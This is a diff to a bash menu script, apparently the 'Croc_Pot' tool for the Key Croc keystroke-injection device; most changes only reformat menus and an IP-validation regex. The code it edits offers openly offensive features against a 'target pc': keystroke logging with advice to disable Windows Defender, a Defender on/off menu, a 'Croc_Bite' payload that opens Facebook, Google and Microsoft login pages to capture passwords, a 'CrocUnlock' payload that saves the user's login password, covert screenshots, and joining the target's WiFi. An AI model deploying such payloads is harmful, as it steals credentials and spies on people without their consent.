+MenuTitle RECON SCAN MENU ; MenuColor 19 1 TCPDUMP SCAN ; MenuColor 19 2 NMAP SCAN ; MenuColor 19 3 TRACEROUTE SCAN ; MenuColor 19 4 WHOIS LOOKUP SCAN ; MenuColor 19 5 DNS LOOKUP SCAN
+MenuColor 19 6 PING TARGET SCAN ; MenuColor 19 7 TARGET PORT SCAN ; MenuColor 19 8 SSL/TLS SSLSCAN ; MenuColor 19 9 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) tcpdump_scan ; croc_recon ;;
-	2) nmap_menu ; croc_recon ;;
-	3) traceroute_scan ; croc_recon ;;
-	4) whois_scan ; croc_recon ;;
-	5) dns_scan ; croc_recon ;;
-	6) target_ping ; croc_recon ;;
-	7) target_port ; croc_recon ;;
-	8) ssl_scan ; croc_recon ;;
-	9) main_menu ;;
-	0) exit 0 ;;
-	[bB]) menu_B ;;
-	*) invalid_entry ; croc_recon ;;
+	1) tcpdump_scan ; croc_recon ;; 2) nmap_menu ; croc_recon ;; 3) traceroute_scan ; croc_recon ;; 4) whois_scan ; croc_recon ;; 5) dns_scan ; croc_recon ;; 6) target_ping ; croc_recon ;;
+	7) target_port ; croc_recon ;; 8) ssl_scan ; croc_recon ;; 9) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; croc_recon ;;
 	esac
 }
 ##
@@ -704,7 +686,8 @@ MenuEnd
 ##
 keystorkes_laptop() {
 	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> ${OS_CHECK}\n"
-	echo -ne "$(Info_Screen '-With this payload you can log Keystorkes from windows laptop pc
+	echo -ne "$(Info_Screen '
+-With this payload you can log Keystorkes from windows laptop pc
 -May need to disenable windows defender for this to work
 -TO STOP THE PAYLOAD PRESS Ctrl + c
 -When stop this will open up notepad and save to loot/Croc_Pot')\n"
@@ -835,7 +818,8 @@ fi
 ##
 windows_check() {
 	clear
-	echo -ne "$(Info_Screen '-WINDOWS SCAN CAN TAKE UP TO 1 MIN TO RUN
+	echo -ne "$(Info_Screen '
+-WINDOWS SCAN CAN TAKE UP TO 1 MIN TO RUN
 -This is an Bash Bunny payload working on the Croc
 -This will Scan an Windows pc and collect alot of information
 -Save to loot/Croc_pot folder')\n"
@@ -905,7 +889,8 @@ cat ${LOOT_WIND}
 croc_vpn() {
 	local vpn_file_A=/etc/openvpn/*.ovpn
 	local vpn_file=/root/udisk/*.ovpn
-	echo -ne "$(Info_Screen '-First you will need to download the (filename.ovpn) file
+	echo -ne "$(Info_Screen '
+-First you will need to download the (filename.ovpn) file
 -From your VPN server of choice
 -Place it on the keycroc root of the udisk
 -Then select #1 VPN SETUP to do the rest
@@ -933,26 +918,10 @@ fi
 ##
 #----VPN Menu
 ##
-MenuTitle VPN MENU
-MenuColor 1 VPN SETUP ; echo -ne "           ${clear}\n"
-MenuColor 2 ENABLE VPN ; echo -ne "          ${clear}\n"
-MenuColor 3 DISABLE VPN ; echo -ne "         ${clear}\n"
-MenuColor 4 VPN STATUS ; echo -ne "          ${clear}\n"
-MenuColor 5 EDIT .OVPN FILE ; echo -ne "     ${clear}\n"
-MenuColor 6 REMOVE VPN FILES ; echo -ne "    ${clear}\n"
-MenuColor 7 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle VPN MENU ; MenuColor 19 1 VPN SETUP ; MenuColor 19 2 ENABLE VPN ; MenuColor 19 3 DISABLE VPN ; MenuColor 19 4 VPN STATUS ; MenuColor 19 5 EDIT .OVPN FILE ; MenuColor 19 6 REMOVE VPN FILES ; MenuColor 19 7 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) setup_vpn ; croc_vpn ;;
-	2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
-	3) killall openvpn ; service openvpn restart ; echo -ne "\n$(ColorRed 'DISABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
-	4) route -n ; ifconfig ; ip route show ; systemctl status openvpn* ; croc_vpn ;;
-	5) nano ${vpn_file_A} ; croc_vpn ;;
-	6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')\n" ; croc_vpn ;;
-	7) main_menu ;;
-	0) exit 0 ;;
-	[bB]) menu_B ;;
-	*) invalid_entry ; croc_vpn ;;
+	1) setup_vpn ; croc_vpn ;; 2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;; 3) killall openvpn ; service openvpn restart ; echo -ne "\n$(ColorRed 'DISABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;; 4) route -n ; ifconfig ; ip route show ; systemctl status openvpn* ; croc_vpn ;;
+	5) nano ${vpn_file_A} ; croc_vpn ;; 6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')\n" ; croc_vpn ;; 7) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; croc_vpn ;;
 	esac
 }
 ##
@@ -960,7 +929,8 @@ MenuEnd
 ##
 pass_time() {
 	clear
-	echo -ne "$(Info_Screen '-I am not the developer of these scripts
+	echo -ne "$(Info_Screen '
+-I am not the developer of these scripts
 -Thought I would share them
 -Show the power of the keycroc and bash scripting')\n"
 ##
@@ -1100,7 +1070,7 @@ fi
 #	$1	IP address to validate
 # Return 0 if valid, 1 otherwise
 function validIP() {
-if [[ "$1" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]] ; then
+if [[ "$1" =~ ${validate_ip} ]] ; then
 	return 0
 else
 	return 1
@@ -3555,24 +3525,9 @@ init_game
 ##
 #   - Pass time Menu
 ##
-MenuTitle PASS TIME GAMES
-MenuColor 1 CHESS ; echo -ne "               ${clear}\n"
-MenuColor 2 TETRIS ; echo -ne "              ${clear}\n"
-MenuColor 3 SNAKE ; echo -ne "               ${clear}\n"
-MenuColor 4 MATRIX ; echo -ne "              ${clear}\n"
-MenuColor 5 TIC-TAC-TOE ; echo -ne "         ${clear}\n"
-MenuColor 6 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle PASS TIME GAMES ; MenuColor 19 1 CHESS ; MenuColor 19 2 TETRIS ; MenuColor 19 3 SNAKE ; MenuColor 19 4 MATRIX ; MenuColor 19 5 TIC-TAC-TOE ; MenuColor 19 6 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) chess_game ; pass_time ;;
-	2) tetris_game ; pass_time ;;
-	3) snake_game ; pass_time ;;
-	4) matrix_effect ; pass_time ;;
-	5) tac_toe ; pass_time ;;
-	6) main_menu ;;
-	0) exit 0 ;;
-	[bB]) menu_B ;;
-	*) invalid_entry ; pass_time ;;
+	1) chess_game ; pass_time ;; 2) tetris_game ; pass_time ;; 3) snake_game ; pass_time ;; 4) matrix_effect ; pass_time ;; 5) tac_toe ; pass_time ;; 6) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; pass_time ;;
 	esac
 }
 ##
@@ -3640,18 +3595,9 @@ defender_disable() {
 #----Windows defender ENABLE/DISABLE Menu
 ##
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-MenuTitle WINDOWS DEFENDER
-MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "  ${clear}\n"
-MenuColor 2 DISABLE WINDOWS DEFENDER ; echo -ne " ${clear}\n"
-MenuColor 3 RETURN TO MAIN MENU ; echo -ne "      ${clear}\n"
-MenuEnd
+MenuTitle WINDOWS DEFENDER ; MenuColor 25 1 ENABLE WINDOWS DEFENDER ; MenuColor 25 2 DISABLE WINDOWS DEFENDER ; MenuColor 25 3 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) defender_enable ; croc_pot_plus ;;
-	2) defender_disable ; croc_pot_plus ;;
-	3) main_menu ;;
-	0) exit 0 ;;
-	[bB]) menu_B ;;
-	*) invalid_entry ; windows_defender ;;
+	1) defender_enable ; croc_pot_plus ;; 2) defender_disable ; croc_pot_plus ;; 3) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; windows_defender ;;
 	esac
 else
 	echo -ne "\n\e[5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This will not work on this OS')-->$(OS_CHECK)\n"
@@ -3662,7 +3608,8 @@ fi
 ##
 function install_payloads() {
 	clear
-	echo -ne "$(Info_Screen '-Select which Payload you would like to install')\n\n"
+	echo -ne "$(Info_Screen '
+-Select which Payload you would like to install')\n\n"
 ##
 #----Getonline Payload Function
 ##
@@ -3671,7 +3618,8 @@ get_online_p() {
 	local GETONLINE_WINDOWS=/root/udisk/payloads/Getonline_Windows.txt
 	local GETONLINE_LINUX=/root/udisk/payloads/Getonline_Linux.txt
 	local GETONLINE_RASPBERRY=/root/udisk/payloads/Getonline_Raspberry.txt
-	echo -ne "$(Info_Screen '-Payload Called GetOnline
+	echo -ne "$(Info_Screen '
+-Payload Called GetOnline
 -Connect automatically to target pc WIFI (Windows/Linux/Raspberry)
 -After install unplug and plug into target pc and type in below
 -getonline <-- MATCH word for windows
@@ -3753,7 +3701,8 @@ fi
 ##
 croc_unlock_p() {
 	clear
-	echo -ne "$(Info_Screen '-Start by pressing GUI + l this will bring you to login screen
+	echo -ne "$(Info_Screen '
+-Start by pressing GUI + l this will bring you to login screen
 -This will forus the user to enter password and save to tools/Croc_Pot
 -This will create another payload called Croc_unlock_2.txt
 -Next time at login screen type in crocunlock
@@ -3791,7 +3740,8 @@ fi
 ##
 wifi_setup_p() {
 	clear
-	echo -ne "$(Info_Screen '-WITH THIS PAYLOAD YOU CAN CREATE MULTIPLE WIFI SETTING
+	echo -ne "$(Info_Screen '
+-WITH THIS PAYLOAD YOU CAN CREATE MULTIPLE WIFI SETTING
 -THE PURPOSE OF THIS PAYLOAD IS THAT IF YOU MOVE YOUR KEYCROC
 -AROUND TO DIFFERENT WIFI ACCESS POINTS
 -YOU CAN CREATE A PAYLOAD WITH MATCH WORD
@@ -3809,7 +3759,8 @@ else
 	echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
 MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
 	echo -ne "\n${red}***${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}***${clear}\n
-$(Info_Screen '--UNPLUG THE KEYCROC AND PLUG BACK IN
+$(Info_Screen '
+--UNPLUG THE KEYCROC AND PLUG BACK IN
 --TYPE IN YOUR MATCH WORD LED WILL LIGHT UP GREEN
 --THEN UNPLUG THE KEYCROC AND PLUG BACK IN
 --YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP\n')\n"
@@ -3822,7 +3773,8 @@ done
 ##
 quick_croc_pot () {
 	clear
-	echo -ne "\n$(Info_Screen '-Create payload
+	echo -ne "\n$(Info_Screen '
+-Create payload
 -Quickly Start Croc_Pot without OS detection
 -This is for when you Already ran OS detection on target pc by crocpot
 -Match word is qspot')\n\n"
@@ -3854,7 +3806,8 @@ fi
 ##
 screen_shot() {
 	clear
-	echo -ne "$(Info_Screen '-Option to install Croc_Shot.txt payload this will take screenshot of Target pc
+	echo -ne "$(Info_Screen '
+-Option to install Croc_Shot.txt payload this will take screenshot of Target pc
 -To start the Croc_Shot payload type in crocshot
 -This will save to loot/Croc_Pot/screenshot
 -Option to take screenshot now
@@ -4003,7 +3956,8 @@ esac
 ##
 croc_bite() {
 	clear
-	echo -ne "$(Info_Screen '-Attempt to retrieve target pc Social media account passwd
+	echo -ne "$(Info_Screen '
+-Attempt to retrieve target pc Social media account passwd
 -Create a payload called Croc_Bite.txt MATCH word will be Social media name 
 -This will open target pc web browser and open up Social media login page
 -If successful passwd saved at /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered
@@ -4050,28 +4004,12 @@ raspberrypi)\n	Q GUI d\n	Q CONTROL-ALT-F1\n	sleep 1\n	Q STRING \"cp -u /usr/shar
 ##
 #----Croc_Bite menu
 ##
-MenuTitle CROC BITE MENU
-MenuColor 1 FACEBOOK ATTEMPT ; echo -ne "    ${clear}\n"
-MenuColor 2 INSTAGRAM ATTEMPT ; echo -ne "   ${clear}\n"
-MenuColor 3 TWITTER ATTEMPT ; echo -ne "     ${clear}\n"
-MenuColor 4 TIKTOK ATTEMPT ; echo -ne "      ${clear}\n"
-MenuColor 5 MESSENGER ATTEMPT ; echo -ne "   ${clear}\n"
-MenuColor 6 GOOGLE ATTEMPT ; echo -ne "      ${clear}\n"
-MenuColor 7 MICROSOFT ATTEMPT ; echo -ne "   ${clear}\n"
-MenuColor 8 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle CROC BITE MENU ; MenuColor 19 1 FACEBOOK ATTEMPT ; MenuColor 19 2 INSTAGRAM ATTEMPT ; MenuColor 19 3 TWITTER ATTEMPT ; MenuColor 19 4 TIKTOK ATTEMPT
+MenuColor 19 5 MESSENGER ATTEMPT ; MenuColor 19 6 GOOGLE ATTEMPT ; MenuColor 19 7 MICROSOFT ATTEMPT ; MenuColor 19 8 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) bite_payload facebook https://www.facebook.com/login/ ; install_payloads ;;
-	2) bite_payload instagram https://www.instagram.com/accounts/login/ ; install_payloads ;;
-	3) bite_payload twitter https://twitter.com/login/ ; install_payloads ;;
-	4) bite_payload tiktok https://careers.tiktok.com/login ; install_payloads ;;
-	5) bite_payload messenger https://www.messenger.com/login/ ; install_payloads ;;
-	6) bite_payload google https://accounts.google.com/signin ; install_payloads ;;
-	7) bite_payload microsoft https://login.microsoftonline.com/ ; install_payloads ;;
-	8) main_menu ;;
-	0) exit 0 ;;
-	[bB]) install_payloads ;;
-	*) invalid_entry ; reboot_shutdown ;;
+	1) bite_payload facebook https://www.facebook.com/login/ ; install_payloads ;; 2) bite_payload instagram https://www.instagram.com/accounts/login/ ; install_payloads ;; 3) bite_payload twitter https://twitter.com/login/ ; install_payloads ;; 4) bite_payload tiktok https://careers.tiktok.com/login ; install_payloads ;;
+	5) bite_payload messenger https://www.messenger.com/login/ ; install_payloads ;; 6) bite_payload google https://accounts.google.com/signin ; install_payloads ;; 7) bite_payload microsoft https://login.microsoftonline.com/ ; install_payloads ;;
+	8) main_menu ;; 0) exit 0 ;; [bB]) install_payloads ;; *) invalid_entry ; reboot_shutdown ;;
 	esac
 }
 ##
@@ -4079,7 +4017,8 @@ MenuEnd
 ##
 web_site() {
 	clear
-	echo -ne "$(Info_Screen '-Enter web site name example https://www.google.com
+	echo -ne "$(Info_Screen '
+-Enter web site name example https://www.google.com
 -This will open target pc default web browser and start website')\n\n"
 read_all START WEB SITE Y/N AND PRESS [ENTER]
 case $r_a in
@@ -4095,28 +4034,11 @@ esac
 ##
 #----Install Payloads Menu
 ##
-MenuTitle INSTALL PAYLOADS MENU
-MenuColor 1 GETONLINE PAYLOAD ; echo -ne "    ${clear}\n"
-MenuColor 2 CROCUNLOCK PAYLOAD ; echo -ne "   ${clear}\n"
-MenuColor 3 WIFI SETUP PAYLOAD ; echo -ne "   ${clear}\n"
-MenuColor 4 QUICK START CROC_POT ; echo -ne " ${clear}\n"
-MenuColor 5 CROCSHOT PAYLOAD ; echo -ne "     ${clear}\n"
-MenuColor 6 CROC_BITE PAYLOAD ; echo -ne "    ${clear}\n"
-MenuColor 7 OPEN WEB SITE ; echo -ne "        ${clear}\n"
-MenuColor 8 RETURN TO MAIN MENU ; echo -ne "  ${clear}\n"
-MenuEnd
+MenuTitle INSTALL PAYLOADS MENU ; MenuColor 21 1 GETONLINE PAYLOAD ; MenuColor 21 2 CROCUNLOCK PAYLOAD ; MenuColor 21 3 WIFI SETUP PAYLOAD ; MenuColor 21 4 QUICK START CROC_POT
+MenuColor 21 5 CROCSHOT PAYLOAD ; MenuColor 21 6 CROC_BITE PAYLOAD ; MenuColor 21 7 OPEN WEB SITE ; MenuColor 21 8 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) get_online_p ; install_payloads ;;
-	2) croc_unlock_p ; install_payloads ;;
-	3) wifi_setup_p ; install_payloads ;;
-	4) quick_croc_pot ; install_payloads ;;
-	5) screen_shot ; install_payloads ;;
-	6) croc_bite ; install_payloads ;;
-	7) web_site ; install_payloads ;;
-	8) main_menu ;;
-	0) exit 0 ;;
-	[bB]) menu_B ;;
-	*) invalid_entry ; install_payloads ;;
+	1) get_online_p ; install_payloads ;; 2) croc_unlock_p ; install_payloads ;; 3) wifi_setup_p ; install_payloads ;; 4) quick_croc_pot ; install_payloads ;; 5) screen_shot ; install_payloads ;;
+	6) croc_bite ; install_payloads ;; 7) web_site ; install_payloads ;; 8) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
 	esac
 }
 ##
@@ -4125,7 +4047,8 @@ MenuEnd
 omg_cable() {
 	clear
 	local omg_v=/root/udisk/tools/Croc_Pot/OMG_WIFI.txt
-	echo -ne "$(Info_Screen '-# 1 connect keycroc to O.MG wifi access point
+	echo -ne "$(Info_Screen '
+-# 1 connect keycroc to O.MG wifi access point
 -# 2 Start O.MG web UI ensure keycroc is connected to O.MG AP first
 -# 3 O.MG Github web page
 -# 4 Create payload to connect Quickly to O.MG wifi access point
@@ -4135,7 +4058,8 @@ omg_cable() {
 ##
 omg_wifi() {
 	clear
-	echo -ne "$(Info_Screen '-Connect keycroc wifi to O.MG wifi access point
+	echo -ne "$(Info_Screen '
+-Connect keycroc wifi to O.MG wifi access point
 -Ensure O.MG cable is setup as wifi access point
 -The purpose to this is access O.MG cable or Keycroc remotely
 -From a remote device that is connected to O.MG wifi access point')\n\n"
@@ -4223,7 +4147,8 @@ esac
 ##
 omg_web() {
 	clear
-	echo -ne "$(Info_Screen '-Open target pc web browser and start O.MG web UI
+	echo -ne "$(Info_Screen '
+-Open target pc web browser and start O.MG web UI
 -Ensure target pc is connected to O.MG wifi access point first')\n\n"
 	read_all START O.MG WEB UI Y/N AND PRESS [ENTER]
 case $r_a in
@@ -4240,7 +4165,8 @@ esac
 ##
 omg_quick_connect() {
 	clear
-	echo -ne "$(Info_Screen '-Create payload to connect Quickly to O.MG wifi access point
+	echo -ne "$(Info_Screen '
+-Create payload to connect Quickly to O.MG wifi access point
 Select # 3 WIFI SETUP PAYLOAD to create payload')\n\n"
 	read_all CREATE PAYLOAD FOR O.MG QUICK CONNECT AP Y/N AND PRESS [ENTER]
 case $r_a in
@@ -4257,7 +4183,8 @@ esac
 ##
 omg_check() {
 	clear
-	echo -ne "$(Info_Screen '-Check local network for O.MG cable
+	echo -ne "$(Info_Screen '
+-Check local network for O.MG cable
 -Ensure O.MG is connected to same local network as Keycroc')\n\n"
 ##
 #----Ping entire network 
@@ -4266,10 +4193,10 @@ omg_check() {
 case $r_a in
 [yY] | [yY][eE][sS])
 	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
-	for omg in {1..254} ;do (ping -c 1 -w 1 $t_ip$omg >/dev/null && echo "$t_ip$omg" &) ;done
+	for omg in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$omg >/dev/null && echo "$t_ip$omg" &) ;done
 	arp -a | sed -n 's/\(OMG\)/\1/p'
 	local omg_ip=$(arp -a | sed -n 's/\(OMG\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
-	if [[ "${omg_ip}" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]]; then
+	if [[ "${omg_ip}" =~ ${validate_ip} ]]; then
 		ping -q -c 1 -w 1 ${omg_ip} &>/dev/null 2>&1
 		if [[ $? -ne 0 ]]; then
 			echo -ne "${red}No O.MG cable detected${clear}"
@@ -4297,24 +4224,9 @@ esac
 ##
 #----O.MG cable Menu
 ##
-MenuTitle O.MG CABLE MENU
-MenuColor 1 KEYCROC TO O.MG WIFI ; echo -ne " ${clear}\n"
-MenuColor 2 START O.MG WEB UI ; echo -ne "    ${clear}\n"
-MenuColor 3 O.MG GITHUB PAGE ; echo -ne "     ${clear}\n"
-MenuColor 4 O.MG AP PAYLOAD ; echo -ne "      ${clear}\n"
-MenuColor 5 O.MG LOCAL NETWORK ; echo -ne "   ${clear}\n"
-MenuColor 6 RETURN TO MAIN MENU ; echo -ne "  ${clear}\n"
-MenuEnd
+MenuTitle O.MG CABLE MENU ; MenuColor 21 1 KEYCROC TO O.MG WIFI ; MenuColor 21 2 START O.MG WEB UI ; MenuColor 21 3 O.MG GITHUB PAGE ; MenuColor 21 4 O.MG AP PAYLOAD ; MenuColor 21 5 O.MG LOCAL NETWORK ; MenuColor 21 6 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) omg_wifi ; omg_cable ;;
-	2) omg_web ; omg_cable ;;
-	3) start_web https://github.com/O-MG ; omg_cable ;;
-	4) omg_quick_connect ;;
-	5) omg_check ; omg_cable ;;
-	6) main_menu ;;
-	0) exit 0 ;;
-	[bB]) menu_B ;;
-	*) invalid_entry ; omg_cable ;;
+	1) omg_wifi ; omg_cable ;; 2) omg_web ; omg_cable ;; 3) start_web https://github.com/O-MG ; omg_cable ;; 4) omg_quick_connect ;; 5) omg_check ; omg_cable ;; 6) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; omg_cable ;;
 	esac
 }
 ##
@@ -4324,30 +4236,11 @@ menu_B() {
 	clear
 	LED B
 	croc_title
-MenuTitle CROC POT PLUS MENU
-MenuColor 1 RECON SCAN ; echo -ne "          ${clear}\n"
-MenuColor 2 KEYSTORKES LAPTOP ; echo -ne "   ${clear}\n"
-MenuColor 3 WINDOWS INFO SCAN ; echo -ne "   ${clear}\n"
-MenuColor 4 CROC VPN SETUP ; echo -ne "      ${clear}\n"
-MenuColor 5 PASS TIME GAMES ; echo -ne "     ${clear}\n"
-MenuColor 6 WINDOWS DEFENDER ; echo -ne "    ${clear}\n"
-MenuColor 7 INSTALL PAYLOADS ; echo -ne "    ${clear}\n"
-MenuColor 8 O.MG CABLE ; echo -ne "          ${clear}\n"
-MenuColor 9 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle CROC POT PLUS MENU ; MenuColor 20 1 RECON SCAN ; MenuColor 20 2 KEYSTORKES LAPTOP ; MenuColor 20 3 WINDOWS INFO SCAN ; MenuColor 20 4 CROC VPN SETUP ; MenuColor 20 5 PASS TIME GAMES
+MenuColor 20 6 WINDOWS DEFENDER  ; MenuColor 20 7 INSTALL PAYLOADS ; MenuColor 20 8 O.MG CABLE ; MenuColor 20 9 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) croc_recon ; menu_B ;;
-	2) keystorkes_laptop ; menu_B ;;
-	3) windows_check ; menu_B ;;
-	4) croc_vpn ; menu_B ;;
-	5) pass_time ; menu_B ;;
-	6) windows_defender ; menu_B ;;
-	7) install_payloads ; menu_B ;;
-	8) omg_cable ; menu_B ;;
-	9) main_menu ;;
-	0) exit 0 ;;
-	[bB]) main_menu ;;
-	*) invalid_entry ; menu_B ;;
+	1) croc_recon ; menu_B ;; 2) keystorkes_laptop ; menu_B ;; 3) windows_check ; menu_B ;; 4) croc_vpn ; menu_B ;; 5) pass_time ; menu_B ;; 6) windows_defender ; menu_B ;;
+	7) install_payloads ; menu_B ;; 8) omg_cable ; menu_B ;; 9) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; menu_B ;;
 	esac
  }
 menu_B
@@ -4390,9 +4283,9 @@ tcp_check() {
 	clear
 	install_package speedtest-cli SPEEDTEST-CLI tcp_check
 	echo -ne "\n$(ColorYellow 'Network/connections on') ${server_name} is:\n"
-	netstat -l ; echo ${LINE} ; netstat -r ; echo ${LINE} ; netstat -tunlp ; echo ${LINE} ; iw dev wlan0 scan ; echo ${LINE}
+	echo ${LINE} ; netstat -l ; echo ${LINE} ; netstat -r ; echo ${LINE} ; netstat -tunlp ; echo ${LINE} ; iw dev wlan0 scan ; echo ${LINE}
 	iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort ; echo ${LINE}
-	arp -a -e -v ; echo ${LINE} ; ss -p -a ; echo ${LINE} ; /sbin/ifconfig -a ; echo ${LINE} ; curl -i ipinfo.io ; curl -i freegeoip.net/json/ ; echo ${LINE}
+	arp -a -e -v ; echo ${LINE} ; ss -p -a ; echo ${LINE} ; for interface in $(ls /sys/class/net/); do echo -ne "${interface}\n"; done ; /sbin/ifconfig -a ; echo ${LINE} ; curl -i ipinfo.io ; curl -i freegeoip.net/json/ ; echo ${LINE}
